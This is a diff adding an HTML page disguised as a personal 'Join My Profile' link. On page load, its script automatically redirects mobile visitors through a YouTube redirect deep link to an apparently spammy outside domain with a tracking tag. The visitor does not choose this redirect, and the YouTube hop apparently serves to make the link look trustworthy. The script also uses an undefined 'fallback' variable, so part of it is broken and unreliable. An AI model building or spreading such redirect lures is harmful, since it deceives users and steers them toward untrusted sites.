@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Join My Profile</title>
+
+</head>
+
+<body>
+  <img src="https://drive.google.com/uc?id=1x5-GP4kp6lW0F97IkNLS8ZDlQiWecw8D" alt="Profile Picture">
+  <button onclick="myFunction()">View my profile</button>
+<script>
+    setTimeout(function() {
+      myFunction();
+    }, 1000);
+    
+    function myFunction() {
+      var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbmtYN3IzMVoxTTFfSlk1NkVjcXdER3VZNWpJUXxBQ3Jtc0tsSDlBRWs4Q2wxVHVVSTdfNGNTT0M1elMwRHo0RGVMUTB1TkRmTzZvVFpCTDRSd2h5cEc4NXQ1U3EyVE1oWG9aYVdSS0hkVzVnMG9TSmNWclZDdHItRXJIZ3lYM014aFFzUF9lLXM0eHo5NzlaY0tsOA&q=https%3A%2F%2Fdesirablegalel8e.com%2F%3Futm_source%3DJEtZ91DudqZiE&html_redirect=1";
+
+      if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+          window.location = app;
+          window.setTimeout(function() {
+              window.location = fallback;
+          }, 25);
+      } else {
+          window.location = fallback;
+      }
+
+      function killPopup() {
+          window.removeEventListener('pagehide', killPopup);
+      }
+
+      window.addEventListener('pagehide', killPopup);
+    }
+</script>
+</body>
+</html>
